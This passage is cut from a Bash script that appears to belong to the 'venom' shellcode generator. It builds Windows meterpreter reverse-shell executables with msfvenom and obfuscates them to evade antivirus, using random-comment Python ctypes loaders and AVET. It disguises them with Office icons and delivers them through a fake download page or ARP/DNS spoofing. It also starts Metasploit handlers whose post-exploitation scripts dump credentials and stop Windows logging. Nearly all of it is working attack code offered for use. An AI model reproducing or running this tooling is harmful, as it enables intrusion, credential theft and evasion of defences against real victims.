..${Reset};\n  sleep 2\n  sh_microsoft_menu\n  clear\nfi\n}\n\n\n\n\n# -----------------------------------------------------\n# C - PYTHON to EXE shellcode (SSL/TLS eavesdrop)\n# ------------------------------------------------------\nsh_shellcode23 () {\n# run module or abort ? \nQuE=$(zenity --question --title=\"☠ UUID random keys evasion ☠\" --text \"Author: r00t-3xp10it | null-byte\\nAdding ramdom comments into sourcecode\\nwill help evading AVs signature detection (@nullbite)\\n'a computer can never outsmart a always changing virus'\\n\\nRun uuid module?\" --width 370) > /dev/null 2>&1\nif [ \"$?\" -eq \"0\" ]; then\n# get user input to build shellcode\necho \"[☠] Enter shellcode settings!\"\nlhost=$(zenity --title=\"☠ Enter LHOST ☠\" --text \"example: $IP\" --entry --width 300) > /dev/null 2>&1\nlport=$(zenity --title=\"☠ Enter LPORT ☠\" --text \"example: 666\" --entry --width 300) > /dev/null 2>&1\n# input payload choise\npaylo=$(zenity --list --title \"☠ SHELLCODE GENERATOR ☠\" --text \"\\nAvailable Payloads:\" --radiolist --column \"Pick\" --column \"Option\" TRUE \"windows/meterpreter/reverse_winhttps\" FALSE \"windows/meterpreter/reverse_https\" FALSE \"windows/meterpreter/reverse_http\" FALSE \"windows/x64/meterpreter/reverse_https\" --width 350 --height 260) > /dev/null 2>&1\nN4m=$(zenity --entry --title \"☠ PAYLOAD NAME ☠\" --text \"Enter payload output name\\nexample: SSLbinary\" --width 300) > /dev/null 2>&1\necho \"[☠] editing/backup files...\"\n\n\n## setting default values in case user have skip this ..\nif [ -z \"$lhost\" ]; then lhost=\"$IP\";fi\nif [ -z \"$lport\" ]; then lport=\"443\";fi\nif [ -z \"$N4m\" ]; then N4m=\"SSLbinary\";fi\n\necho \"[☠] Loading uuid(@nullbyte) obfuscation module ..\"\nsleep 1\necho \"[☠] Building shellcode -> C,SSL/TLS format ..\"\nsleep 2\necho \"[☠] meterpreter over SSL sellected ..\"\nsleep 1\n# display final settings to user\ncat << !\n\n    venom settings\n    ──────────────\n    LPORT   : $lport\n    LHOST   : $lhost\n    FORMAT  : C,SSL/TLS -> WINDOWS(EXE)\n    PAYLOAD : $paylo\n\n!\n\n# use metasploit to build shellcode (msf encoded)\n# https://nodistribute.com/result/0DGFYgWdtaKuv8NzMiqAwJIQfmBy (2/39) py raw\n# https://nodistribute.com/result/BunD148C79GOQkxj0g2deHqI (3/39) py exe\n# https://nodistribute.com/result/LDynoZOq9A5TeBMYFW4k (2/39) nullbite obfuscation\nxterm -T \" SHELLCODE GENERATOR \" -geometry 110x23 -e \"msfvenom -p $paylo LHOST=$lhost LPORT=$lport PayloadUUIDTracking=true HandlerSSLCert=$IPATH/obfuscate/www.gmail.com.pem StagerVerifySSLCert=true PayloadUUIDName=ParanoidStagedPSH --smallest -f c | tr -d '\\\"' | tr -d '\\n' | more > $IPATH/output/chars.raw\"\n\n\necho \"\"\n# strip bad caracters and store shellcode \nstore=`cat $IPATH/output/chars.raw | awk {'print $5'} | cut -d ';' -f1`\n# display generated code\ncat $IPATH/output/chars.raw\necho \"\" && echo \"\" && echo \"\"\nsleep 2\n\n\n   # check if chars.raw as generated\n   if [ -e \"$IPATH/output/chars.raw\" ]; then\n      echo \"[☠] chars.raw -> found!\"\n      sleep 2\n \n   else\n\n      echo \"[☠] chars.raw -> not found!\"\n      exit\n      fi\n\n\n#\n# Template ramdom keys ..\n# HINT: adding ramdom comments to sourcecode\n# will help evading AVs signature detection (nullbite) \n# \"a computer can never outsmart a always changing virus\" \n#\nNEW_UUID_1=$(cat /dev/urandom | tr -dc 'a-zA-Z0-9' | fold -w $UUID_RANDOM_LENGTH | head -n 1)\nNEW_UUID_2=$(cat /dev/urandom | tr -dc 'a-zA-Z0-9' | fold -w $UUID_RANDOM_LENGTH | head -n 1)\nNEW_UUID_3=$(cat /dev/urandom | tr -dc 'a-zA-Z0-9' | fold -w $UUID_RANDOM_LENGTH | head -n 1)\n#\n# pyinstaller does not accept numbers in funtion names (compiling), so we use only leters ..\n#\nNEW_UUID_4=$(cat /dev/urandom | tr -dc 'a-zA-Z' | fold -w 10 | head -n 1)\nNEW_UUID_5=$(cat /dev/urandom | tr -dc 'a-zA-Z' | fold -w 11 | head -n 1)\nNEW_UUID_6=$(cat /dev/urandom | tr -dc 'a-zA-Z' | fold -w 12 | head -n 1)\n\n\n#\n# Build python Template (random UUID keys)\n#\ncd $IPATH/output\necho \"[☠] build -> template.py\"\nsleep 1\necho \"[✔] Using random UUID keys (evade signature detection)\"\nsleep 1\n#\n# display generated keys to user\n#\necho \"\"\necho \"    Generated key:$NEW_UUID_3\"\nsleep 1\necho \"    Generated key:$NEW_UUID_4\"\nsleep 1\necho \"    Generated key:$NEW_UUID_5\"\nsleep 1\necho \"    Generated key:$NEW_UUID_1\"\nsleep 1\necho \"    Generated key:$NEW_UUID_2\"\nsleep 1\necho \"\"\nsleep 1\n\n\n\necho \"#!/usr/bin/python\" > template.py\necho \"# -*- coding: utf-8 -*-\" >> template.py\necho \"# $NEW_UUID_1\" >> template.py\necho \"from ctypes import *\" >> template.py\necho \"# $NEW_UUID_2\" >> template.py\necho \"$NEW_UUID_3 = (\\\"$store\\\");\" >> template.py\necho \"# gdGtdfASsTmFFsGbaaUnaDtaAvAaTkDKsHFdtGaAGmDoTkEkoT\" >> template.py\necho \"$NEW_UUID_4 = create_string_buffer($NEW_UUID_4, len($NEW_UUID_4))\" >> template.py\necho \"# GSMsdMfhmDjkGjDhMhhMfdsAsasAffWgUkhWWjWjGfdOgEEjue\" >> template.py\necho \"$NEW_UUID_5 = cast($NEW_UUID_5, CFUNCTYPE(c_void_p))\" >> template.py\necho \"# HdFDgFDttPkSMcSsFSKaWdBfDBmkSkOSiBewSDoFtLmDeWsKvG\" >> template.py\necho \"$NEW_UUID_5()\" >> template.py\nsleep 2\n\n     # check if pyinstaller its installed\n     if [ -d $DrIvC/$PiWiN ]; then\n       # compile python to exe\n       echo \"[☠] pyinstaller -> found!\"\n       sleep 2\n       echo \"[☠] compile template.py -> $N4m.exe\"\n       sleep 2\n       cd $IPATH/output\n\n# chose executable final icon (.ico)\niCn=$(zenity --list --title \"☠ REPLACE AGENT ICON ☠\" --text \"\\nChose icon to use:\" --radiolist --column \"Pick\" --column \"Option\" TRUE \"Windows-Store.ico\" FALSE \"Windows-Logo.ico\" FALSE \"Microsoft-Word.ico\" FALSE \"Microsoft-Excel.ico\" --width 320 --height 240) > /dev/null 2>&1\n\n       #\n       # pyinstaller backend appl\n       #\n       xterm -T \" PYINSTALLER \" -geometry 110x23 -e \"su $user -c '$arch c:/$PyIn/Python.exe c:/$PiWiN/pyinstaller.py --noconsole -i $IPATH/bin/icons/$iCn --onefile $IPATH/output/template.py'\"\n       cp $IPATH/output/dist/template.exe $IPATH/output/$N4m.exe\n       rm $IPATH/output/*.spec > /dev/null 2>&1\n       rm $IPATH/output/*.log > /dev/null 2>&1\n       rm -r $IPATH/output/dist > /dev/null 2>&1\n       rm -r $IPATH/output/build > /dev/null 2>&1\n     else\n      echo \"[☠] pyinstaller not found ..\"\n      exit\n     fi\n\n\n# CHOSE HOW TO DELIVER YOUR PAYLOAD\nserv=$(zenity --list --title \"☠ SHELLCODE GENERATOR ☠\" --text \"Payload stored:\\n$IPATH/output/$N4m.exe\\n\\nchose how to deliver: $N4m.exe\" --radiolist --column \"Pick\" --column \"Option\" TRUE \"multi-handler (default)\" FALSE \"apache2 (malicious url)\" --width 305 --height 220) > /dev/null 2>&1\n\n\n   if [ \"$serv\" = \"multi-handler (default)\" ]; then\n      # START METASPLOIT LISTENNER (multi-handler with the rigth payload)\n      echo \"[☠] Start a multi-handler...\"\n      echo \"[☠] Press [ctrl+c] or [exit] to 'exit' meterpreter shell\"\n      echo \"[☯] Please dont test samples on virus total...\"\n        if [ \"$MsFlF\" = \"ON\" ]; then\n          xterm -T \"PAYLOAD MULTI-HANDLER\" -geometry 124x26 -e \"msfconsole -x 'spool $IPATH/output/report.log; use exploit/multi/handler; set PAYLOAD $paylo; set LHOST $lhost; set LPORT $lport; set HandlerSSLCert $IPATH/obfuscate/www.gmail.com.pem; set StagerVerifySSLCert true; set EnableStageEncoding true; set StageEncoder x86/shikata_ga_nai; exploit'\"\n          cd $IPATH/output\n          # delete utf-8/non-ancii caracters from output\n          tr -cd '\\11\\12\\15\\40-\\176' < report.log > final.log\n          sed -i \"s/\\[0m//g\" final.log\n          sed -i \"s/\\[1m\\[34m//g\" final.log\n          sed -i \"s/\\[4m//g\" final.log\n          sed -i \"s/\\[K//g\" final.log\n          sed -i \"s/\\[1m\\[31m//g\" final.log\n          sed -i \"s/\\[1m\\[32m//g\" final.log\n          sed -i \"s/\\[1m\\[33m//g\" final.log\n          mv final.log $N4m-$lhost.log > /dev/null 2>&1\n          rm report.log > /dev/null 2>&1\n          cd $IPATH/\n        else\n          xterm -T \"PAYLOAD MULTI-HANDLER\" -geometry 124x26 -e \"msfconsole -x 'use exploit/multi/handler; set PAYLOAD $paylo; set LHOST $lhost; set LPORT $lport; set HandlerSSLCert $IPATH/obfuscate/www.gmail.com.pem; set StagerVerifySSLCert true; set EnableStageEncoding true; set StageEncoder x86/shikata_ga_nai; exploit'\"\n        fi\n      sleep 2\n\n\n   else\n\n\nP0=$(zenity --list --title \"☠ SHELLCODE GENERATOR ☠\" --text \"\\npost-exploitation module to run\" --radiolist --column \"Pick\" --column \"Option\" TRUE \"sysinfo.rc\" FALSE \"enum_system.rc\" FALSE \"dump_credentials.rc\" FALSE \"fast_migrate.rc\" FALSE \"stop_logfiles_creation.rc\" FALSE \"exploit_suggester.rc\" --width 305 --height 300) > /dev/null 2>&1\n\n\n  if [ \"$P0\" = \"stop_logfiles_creation.rc\" ]; then\n    #\n    # check if dependencies exist ..\n    #\n    if [ -e \"$pHanTom/post/windows/manage/Invoke-Phant0m.rb\" ]; then\n      echo \"[☠] Invoke-Phant0m.rb installed ..\"\n      sleep 2\n    else\n      echo \"[x] Invoke-Phant0m.rb not found ..\"\n      sleep 2\n      echo \"[☠] copy Invoke-Phant0m.rb to msfdb ..\"\n      sleep 2\n      cp $IPATH/aux/msf/Invoke-Phant0m.rb $pHanTom/post/windows/manage/Invoke-Phant0m.rb > /dev/null 2>&1\n      echo \"[☠] Reloading msfdb database ..\"\n      sleep 2\n      xterm -T \"RELOADING MSF DATABASE\" -geometry 110x23 -e \"msfdb reinit\" > /dev/null 2>&1\n      xterm -T \"RELOADING MSF DATABASE\" -geometry 110x23 -e \"msfconsole -q -x 'db_status; reload_all; exit -y'\" > /dev/null 2>&1\n    fi\n\n      #\n      # check if Invoke-Phantom.ps1 exists ..\n      #\n      if [ -e \"$IPATH/aux/Invoke-Phant0m.ps1\" ]; then\n        echo \"[☠] Invoke-Phant0m.ps1 found ..\"\n        sleep 2\n        cp $IPATH/aux/Invoke-Phant0m.ps1 /tmp/Invoke-Phant0m.ps1 > /dev/null 2>&1\n      else\n        echo \"[x] Invoke-Phant0m.ps1 not found ..\"\n        sleep 2\n        echo \"[☠] Please place module in $IPATH/aux folder ..\"\n        sleep 2\n        exit\n      fi\n  fi\n\n\n      # edit files nedded\n      cd $IPATH/templates/phishing\n      cp $InJEc12 mega[bak].html\n      sed \"s|NaM3|$N4m.exe|g\" mega.html > copy.html\n      cp copy.html $ApAcHe/index.html > /dev/null 2>&1\n      cd $IPATH/output\n      cp $N4m.exe $ApAcHe/$N4m.exe > /dev/null 2>&1\n      echo \"[☠] loading -> Apache2Server!\"\n      echo \"---\"\n      echo \"- SEND THE URL GENERATED TO TARGET HOST\"\n\n        if [ \"$D0M4IN\" = \"YES\" ]; then\n        # copy files nedded by mitm+dns_spoof module\n        sed \"s|NaM3|$N4m.exe|\" $IPATH/templates/phishing/mega.html > $ApAcHe/index.html\n        cp $IPATH/output/$N4m.exe $ApAcHe/$N4m.exe\n        echo \"- ATTACK VECTOR: http://mega-upload.com\"\n        echo \"- POST EXPLOIT : $P0\"\n        echo \"---\"\n        # START METASPLOIT LISTENNER (multi-handler with the rigth payload)\n        echo \"[☠] Start a multi-handler...\"\n        echo \"[☠] Press [ctrl+c] or [exit] to 'exit' meterpreter shell\"\n        echo \"[☯] Please dont test samples on virus total...\"\n          if [ \"$MsFlF\" = \"ON\" ]; then\n          xterm -T \"PAYLOAD MULTI-HANDLER\" -geometry 124x26 -e \"msfconsole -x 'spool $IPATH/output/report.log; use exploit/multi/handler; set PAYLOAD $paylo; set LHOST $lhost; set LPORT $lport; set AutoRunScript multi_console_command -r $IPATH/aux/$P0; set HandlerSSLCert $IPATH/obfuscate/www.gmail.com.pem; set StagerVerifySSLCert true; set EnableStageEncoding true; set StageEncoder x86/shikata_ga_nai; exploit'\" & xterm -T \" DNS_SPOOF [redirecting traffic] \" -geometry 110x10 -e \"sudo ettercap -T -q -i $InT3R -P dns_spoof -M ARP // //\"\n          cd $IPATH/output\n          # delete utf-8/non-ancii caracters from output\n          tr -cd '\\11\\12\\15\\40-\\176' < report.log > final.log\n          sed -i \"s/\\[0m//g\" final.log\n          sed -i \"s/\\[1m\\[34m//g\" final.log\n          sed -i \"s/\\[4m//g\" final.log\n          sed -i \"s/\\[K//g\" final.log\n          sed -i \"s/\\[1m\\[31m//g\" final.log\n          sed -i \"s/\\[1m\\[32m//g\" final.log\n          sed -i \"s/\\[1m\\[33m//g\" final.log\n          mv final.log $N4m-$lhost.log > /dev/null 2>&1\n          rm report.log > /dev/null 2>&1\n          cd $IPATH/\n          else\n          xterm -T \"PAYLOAD MULTI-HANDLER\" -geometry 124x26 -e \"msfconsole -x 'use exploit/multi/handler; set PAYLOAD $paylo; set LHOST $lhost; set LPORT $lport; set AutoRunScript multi_console_command -r $IPATH/aux/$P0; set HandlerSSLCert $IPATH/obfuscate/www.gmail.com.pem; set StagerVerifySSLCert true; set EnableStageEncoding true; set StageEncoder x86/shikata_ga_nai; exploit'\" & xterm -T \" DNS_SPOOF [redirecting traffic] \" -geometry 110x10 -e \"sudo ettercap -T -q -i $InT3R -P dns_spoof -M ARP // //\"\n          fi\n\n\n        else\n\n\n        echo \"- ATTACK VECTOR: http://$lhost\"\n        echo \"- POST EXPLOIT : $P0\"\n        echo \"---\"\n        # START METASPLOIT LISTENNER (multi-handler with the rigth payload)\n        echo \"[☠] Start a multi-handler...\"\n        echo \"[☠] Press [ctrl+c] or [exit] to 'exit' meterpreter shell\"\n        echo \"[☯] Please dont test samples on virus total...\"\n          if [ \"$MsFlF\" = \"ON\" ]; then\n          xterm -T \"PAYLOAD MULTI-HANDLER\" -geometry 124x26 -e \"msfconsole -x 'spool $IPATH/output/report.log; use exploit/multi/handler; set PAYLOAD $paylo; set LHOST $lhost; set LPORT $lport; set AutoRunScript multi_console_command -r $IPATH/aux/$P0; set HandlerSSLCert $IPATH/obfuscate/www.gmail.com.pem; set StagerVerifySSLCert true; set EnableStageEncoding true; set StageEncoder x86/shikata_ga_nai; exploit'\"\n            cd $IPATH/output\n            # delete utf-8/non-ancii caracters from output\n            tr -cd '\\11\\12\\15\\40-\\176' < report.log > final.log\n            sed -i \"s/\\[0m//g\" final.log\n            sed -i \"s/\\[1m\\[34m//g\" final.log\n            sed -i \"s/\\[4m//g\" final.log\n            sed -i \"s/\\[K//g\" final.log\n            sed -i \"s/\\[1m\\[31m//g\" final.log\n            sed -i \"s/\\[1m\\[32m//g\" final.log\n            sed -i \"s/\\[1m\\[33m//g\" final.log\n            mv final.log $N4m-$lhost.log > /dev/null 2>&1\n            rm report.log > /dev/null 2>&1\n            cd $IPATH/\n          else\n          xterm -T \"PAYLOAD MULTI-HANDLER\" -geometry 124x26 -e \"msfconsole -x 'use exploit/multi/handler; set PAYLOAD $paylo; set LHOST $lhost; set LPORT $lport; set AutoRunScript multi_console_command -r $IPATH/aux/$P0; set HandlerSSLCert $IPATH/obfuscate/www.gmail.com.pem; set StagerVerifySSLCert true; set EnableStageEncoding true; set StageEncoder x86/shikata_ga_nai; exploit'\"\n          fi\n        fi\n   fi\n\nsleep 2\n# CLEANING EVERYTHING UP\necho \"[☠] Cleanning temp generated files...\"\nrm $IPATH/output/chars.raw > /dev/null 2>&1\nrm $ApAcHe/$N4m.exe > /dev/null 2>&1\nrm $ApAcHe/index.html > /dev/null 2>&1\nrm /tmp/Invoke-Phant0m.ps1 > /dev/null 2>&1\nsleep 2\nclear\ncd $IPATH/\n\nelse\n\n  echo ${RedF}[x]${white} Abort module execution ..${Reset};\n  sleep 2\n  sh_microsoft_menu\n  clear\nfi\n}\n\n\n\n\n\n# ------------------------------\n# C - AVET to EXE shellcode  FUD \n# ------------------------------\nsh_shellcode24 () {\n# run module or abort ? \nQuE=$(zenity --question --title=\"☠ AVET AV evasion ☠\" --text \"Author: Daniel Sauder\\nThis module uses AVET to obfuscate\\nthe sourcecode (evade AV detection)\\n\\nRun avet module?\" --width 320) > /dev/null 2>&1\nif [ \"$?\" -eq \"0\" ]; then\n#\n# Check if dependencies are installed ..\n# check if MinGw EXE exists ..\n#\nwhich mingw-gcc > /dev/null 2>&1\nif [ \"$?\" -eq \"0\" ]; then\n  echo \"[☠] MinGw EXE compiler found ..\"\n  sleep 2\nelse\n  echo \"[x] MinGw EXE compiler not found ..\"\n  sleep 2\n    #\n    # check if files/directory exist ..\n    #\n    if [ -e \"/usr/bin/mingw-gcc\" ]; then\n      rm /usr/bin/mingw-gcc > /dev/null 2>&1\n    fi\n    if [ -d \"$DrIvC/MinGW\" ]; then\n      rm -r $DrIvC/MinGW > /dev/null 2>&1\n    fi\n    echo \"[☠] Installing MinGw EXE compiler ..\"\n    cd $IPATH/obfuscate/\n    xterm -T \"Donwloading MinGw EXE compiller\" -geometry 124x26 -e \"wget https://downloads.sourceforge.net/project/mingw/Installer/mingw-get-setup.exe\"\n    xterm -T \"Installing MinGw EXE compiller\" -geometry 124x26 -e \"$arch mingw-get-setup.exe\"\n  #\n  # Building minGW diectory ..\n  #\n  echo \"#!/bin/sh\" >> /usr/bin/mingw-gcc\n  echo \"cd $DrIvC/MinGW/bin\" >> /usr/bin/mingw-gcc\n  echo \"exec wine gcc.exe \\\"\\$@\\\"\" >> /usr/bin/mingw-gcc\n  chmod +x /usr/bin/mingw-gcc\n  echo \"[✔] Done installing MinGW ..\"\n  rm mingw-get-setup.exe > /dev/null 2>&1\n  cd $IPATH/\n  sleep 2\nfi\n#\n# Install avet obfuscated software ..\n#\nif [ -e \"$IPATH/obfuscate/avet/make_avet\" ]; then\n  echo \"[☠] avet obfuscator found ..\"\n  sleep 2\nelse\n  echo \"[x] avet obfuscator not found ..\"\n  sleep 2\n  echo \"[☠] Installing avet software ..\"\n  sleep 1\n    #\n    # build avet ..\n    #\n    if [ -d $IPATH/obfuscate/avet ]; then\n      rm -r $IPATH/obfuscate/avet > /dev/null 2>&1\n    fi\n    cd $IPATH/obfuscate/\n    xterm -T \"Installing avet software\" -geometry 124x26 -e \"git clone https://github.com/govolution/avet.git && sleep 2\"\n  #\n  # Build avet files ..\n  #\n  cd $IPATH/obfuscate/avet\n  gcc make_avet.c -o make_avet\n  gcc sh_format.c -o sh_format\n  echo \"[✔] Done installing avet ..\"\n  sleep 2\n  cd $IPATH/\nfi\n\n\n#\n# Get user input to build shellcode ..\n#\necho \"[☠] Enter shellcode settings!\"\nlhost=$(zenity --title=\"☠ Enter LHOST ☠\" --text \"example: $IP\" --entry --width 300) > /dev/null 2>&1\nlport=$(zenity --title=\"☠ Enter LPORT ☠\" --text \"example: 666\" --entry --width 300) > /dev/null 2>&1\ninteractions=$(zenity --title=\"☠ Enter ENCODER interactions ☠\" --text \"example: 3\" --entry --width 300) > /dev/null 2>&1\n# input payload choise\npaylo=$(zenity --list --title \"☠ SHELLCODE GENERATOR ☠\" --text \"\\nAvailable Payloads:\" --radiolist --column \"Pick\" --column \"Option\" TRUE \"windows/meterpreter/reverse_tcp\" FALSE \"windows/meterpreter/reverse_http\" FALSE \"windows/meterpreter/reverse_https\" FALSE \"windows/x64/meterpreter/reverse_tcp\" FALSE \"windows/x64/meterpreter/reverse_https\" --width 350 --height 290) > /dev/null 2>&1\nN4m=$(zenity --entry --title \"☠ PAYLOAD NAME ☠\" --text \"Enter payload output name\\nexample: AvetPayload\" --width 300) > /dev/null 2>&1\n\n\n## setting default values in case user have skip this ..\nif [ -z \"$lhost\" ]; then lhost=\"$IP\";fi\nif [ -z \"$lport\" ]; then lport=\"443\";fi\nif [ -z \"$N4m\" ]; then N4m=\"AvetPayload\";fi\nif [ -z \"$interactions\" ]; then interactions=\"3\";fi\n\necho \"[☠] Building shellcode -> C format ..\"\nsleep 2\n# display final settings to user\ncat << !\n\n    venom settings\n    ──────────────\n    LPORT   : $lport\n    LHOST   : $lhost\n    FORMAT  : C -> WINDOWS(EXE)\n    PAYLOAD : $paylo\n\n!\n#\n# Use metasploit to build shellcode (msf encoded)\n# https://nodistribute.com/result/YCHgomiEkJrI3BcbtjvGsuexKVp842 (3/39) with -i 3\n# https://nodistribute.com/result/ENZ1b6R2TrYocWHCzy9fwMuQs (0/39) FUD with -F -E\n#\n  if [ \"$paylo\" = \"windows/x64/meterpreter/reverse_tcp\" ] || [ \"$paylo\" = \"windows/x64/meterpreter/reverse_https\" ]; then\n    xterm -T \" SHELLCODE GENERATOR \" -geometry 110x23 -e \"msfvenom -p $paylo LHOST=$lhost LPORT=$lport --platform windows -f c -o $IPATH/obfuscate/avet/template.txt\"\n  else\n    xterm -T \" SHELLCODE GENERATOR \" -geometry 110x23 -e \"msfvenom -p $paylo LHOST=$lhost LPORT=$lport --platform windows -e x86/shikata_ga_nai -i $interactions -f c -o $IPATH/obfuscate/avet/template.txt\"\n  fi\n\necho \"\"\n# display generated code\ncat $IPATH/obfuscate/avet/template.txt\necho \"\" && echo \"\"\nsleep 2\n\n\n# EDITING/BACKUP FILES NEEDED\necho \"[☠] Editing/backup files ..\"\nsleep 2\n\n\n#\n# We can reuse the template.txt from the previous example for decoding the shellcode:\n#\necho \"[☠] Decoding shellcode with avet ..\"\nsleep 2\ncd $IPATH/obfuscate/avet\nif [ -e \"$IPATH/obfuscate/avet/defs.h\" ]; then\n  rm $IPATH/obfuscate/avet/defs.h > /dev/null 2>&1\nfi\n#\n# (decoding/obfuscation)\n#\nxterm -T \"DECODING/OBFUSCATING SOURCECODE\" -geometry 110x20 -e \"./format.sh template.txt > scclean.txt && sleep 2\"\nrm $IPATH/obfuscate/avet/template.txt\nmv scclean.txt template.txt\necho \"[☠] Obfuscating shellcode with avet ..\"\nsleep 1\n\n  if [ \"$paylo\" = \"windows/x64/meterpreter/reverse_tcp\" ] || [ \"$paylo\" = \"windows/x64/meterpreter/reverse_https\" ]; then\n    ./make_avet -f template.txt -X -F -E\n  else\n    ./make_avet -f template.txt -F -E\n  fi\necho \"[☠] Compiling shellcode to exe ..\"\nsleep 2\n# gcc $IPATH/obfuscate/avet/avet.c -o $IPATH/output/$N4m.exe\nsudo mingw-gcc -o $IPATH/output/$N4m.exe $IPATH/obfuscate/avet/avet.c\ncd $IPATH/\nsleep 2\n\n\n#\n# CHOSE HOW TO DELIVER YOUR PAYLOAD\n#\nserv=$(zenity --list --title \"☠ SHELLCODE GENERATOR ☠\" --text \"Payload stored:\\n$IPATH/output/$N4m.exe\\n\\nchose how to deliver: $N4m.exe\" --radiolist --column \"Pick\" --column \"Option\" TRUE \"multi-handler (default)\" FALSE \"apache2 (malicious url)\" --width 305 --height 220) > /dev/null 2>&1\n\n\n   if [ \"$serv\" = \"multi-handler (default)\" ]; then\n      # START METASPLOIT LISTENNER (multi-handler with the rigth payload)\n      echo \"[☠] Start a multi-handler...\"\n      echo \"[☠] Press [ctrl+c] or [exit] to 'exit' meterpreter shell\"\n      echo \"[☯] Please dont test samples on virus total...\"\n        if [ \"$MsFlF\" = \"ON\" ]; then\n          xterm -T \"PAYLOAD MULTI-HANDLER\" -geometry 124x26 -e \"msfconsole -q -x 'spool $IPATH/output/report.log; use exploit/multi/handler; set PAYLOAD $paylo; set LHOST $lhost; set LPORT $lport; exploit'\"\n          cd $IPATH/output\n          # delete utf-8/non-ancii caracters from output\n          tr -cd '\\11\\12\\15\\40-\\176' < report.log > final.log\n          sed -i \"s/\\[0m//g\" final.log\n          sed -i \"s/\\[1m\\[34m//g\" final.log\n          sed -i \"s/\\[4m//g\" final.log\n          sed -i \"s/\\[K//g\" final.log\n          sed -i \"s/\\[1m\\[31m//g\" final.log\n          sed -i \"s/\\[1m\\[32m//g\" final.log\n          sed -i \"s/\\[1m\\[33m//g\" final.log\n          mv final.log $N4m-$lhost.log > /dev/null 2>&1\n          rm report.log > /dev/null 2>&1\n          cd $IPATH/\n        else\n          xterm -T \"PAYLOAD MULTI-HANDLER\" -geometry 124x26 -e \"msfconsole -q -x 'use exploit/multi/handler; set PAYLOAD $paylo; set LHOST $lhost; set LPORT $lport; exploit'\"\n        fi\n      sleep 2\n\n\n   else\n\n\nP0=$(zenity --list --title \"☠ SHELLCODE GENERATOR ☠\" --text \"\\npost-exploitation module to run\" --radiolist --column \"Pick\" --column \"Option\" TRUE \"sysinfo.rc\" FALSE \"enum_system.rc\" FALSE \"dump_credentials.rc\" FALSE \"fast_migrate.rc\" FALSE \"stop_logfiles_creation.rc\" FALSE \"exploit_suggester.rc\" --width 305 --height 300) > /dev/null 2>&1\n\n\n  if [ \"$P0\" = \"stop_logfiles_creation.rc\" ]; then\n    #\n    # check if dependencies exist ..\n    #\n    if [ -e \"$pHanTom/post/windows/manage/Invoke-Phant0m.rb\" ]; then\n      echo \"[☠] Invoke-Phant0m.rb installed ..\"\n      sleep 2\n    else\n      echo \"[x] Invoke-Phant0m.rb not found ..\"\n      sleep 2\n      echo \"[☠] copy Invoke-Phant0m.rb to msfdb ..\"\n      sleep 2\n      cp $IPATH/aux/msf/Invoke-Phant0m.rb $pHanTom/post/windows/manage/Invoke-Phant0m.rb > /dev/null 2>&1\n      echo \"[☠] Reloading msfdb database ..\"\n      sleep 2\n      xterm -T \"RELOADING MSF DATABASE\" -geometry 110x23 -e \"msfdb reinit\" > /dev/null 2>&1\n      xterm -T \"RELOADING MSF DATABASE\" -geometry 110x23 -e \"msfconsole -q -x 'db_status; reload_all; exit -y'\" > /dev/null 2>&1\n    fi\n\n      #\n      # check if Invoke-Phantom.ps1 exists ..\n      #\n      if [ -e \"$IPATH/aux/Invoke-Phant0m.ps1\" ]; then\n        echo \"[☠] Invoke-Phant0m.ps1 found ..\"\n        sleep 2\n        cp $IPATH/aux/Invoke-Phant0m.ps1 /tmp/Invoke-Phant0m.ps1 > /dev/null 2>&1\n      else\n        echo \"[x] Invoke-Phant0m.ps1 not found ..\"\n        sleep 2\n        echo \"[☠] Please place module in $IPATH/aux folder ..\"\n        sleep 2\n        exit\n      fi\n  fi\n\n\n      # edit files nedded\n      cd $IPATH/templates/phishing\n      cp $InJEc12 mega[bak].html\n      sed \"s|NaM3|$N4m.exe|g\" mega.html > copy.html\n      cp copy.html $ApAcHe/index.html > /dev/null 2>&1\n      cd $IPATH/output\n      cp $N4m.exe $ApAcHe/$N4m.exe > /dev/null 2>&1\n      echo \"[☠] loading -> Apache2Server!\"\n      echo \"---\"\n      echo \"- SEND THE URL GENERATED TO TARGET HOST\"\n\n        if [ \"$D0M4IN\" = \"YES\" ]; then\n        # copy files nedded by mitm+dns_spoof module\n        sed \"s|NaM3|$N4m.exe|\" $IPATH/templates/phishing/mega.html > $ApAcHe/index.html\n        cp $IPATH/output/$N4m.exe $ApAcHe/$N4m.exe\n        echo \"- ATTACK VECTOR: http://mega-upload.com\"\n        echo \"- POST EXPLOIT : $P0\"\n        echo \"---\"\n        # START METASPLOIT LISTENNER (multi-handler with the rigth payload)\n        echo \"[☠] Start a multi-handler...\"\n        echo \"[☠] Press [ctrl+c] or [exit] to 'exit' meterpreter shell\"\n        echo \"[☯] Please dont test samples on virus total...\"\n          if [ \"$MsFlF\" = \"ON\" ]; then\n          xterm -T \"PAYLOAD MULTI-HANDLER\" -geometry 124x26 -e \"msfconsole -q -x 'spool $IPATH/output/report.log; use exploit/multi/handler; set PAYLOAD $paylo; set LHOST $lhost; set LPORT $lport; set AutoRunScript multi_console_command -r $IPATH/aux/$P0; exploit'\" & xterm -T \" DNS_SPOOF [redirecting traffic] \" -geometry 110x10 -e \"sudo ettercap -T -q -i $InT3R -P dns_spoof -M ARP // //\"\n          cd $IPATH/output\n          # delete utf-8/non-ancii caracters from output\n          tr -cd '\\11\\12\\15\\40-\\176' < report.log > final.log\n          sed -i \"s/\\[0m//g\" final.log\n          sed -i \"s/\\[1m\\[34m//g\" final.log\n          sed -i \"s/\\[4m//g\" final.log\n          sed -i \"s/\\[K//g\" final.log\n          sed -i \"s/\\[1m\\[31m//g\" final.log\n          sed -i \"s/\\[1m\\[32m//g\" final.log\n          sed -i \"s/\\[1m\\[33m//g\" final.log\n          mv final.log $N4m-$lhost.log > /dev/null 2>&1\n          rm report.log > /dev/null 2>&1\n          cd $IPATH/\n          else\n          xterm -T \"PAYLOAD MULTI-HANDLER\" -geometry 124x26 -e \"msfconsole -q -x 'use exploit/multi/handler; set PAYLOAD $paylo; set LHOST $lhost; set LPORT $lport; set AutoRunScript multi_console_command -r $IPATH/aux/$P0; exploit'\" & xterm -T \" DNS_SPOOF [redirecting traffic] \" -geometry 110x10 -e \"sudo ettercap -T -q -i $InT3R -P dns_spoof -M ARP // //\"\n          fi\n\n\n        else\n\n\n        echo \"- ATTACK VECTOR: http://$lhost\"\n        echo \"- POST EXPLOIT : $P0\"\n        echo \"---\"\n        # START METASPLOIT LISTENNER (multi-handler with the rigth payload)\n        echo \"[☠] Start a multi-handler...\"\n        echo \"[☠] Press [ctrl+c] or [exit] to 'exit' meterpreter shell\"\n        echo \"[☯] Please dont test samples on virus total...\"\n          if [ 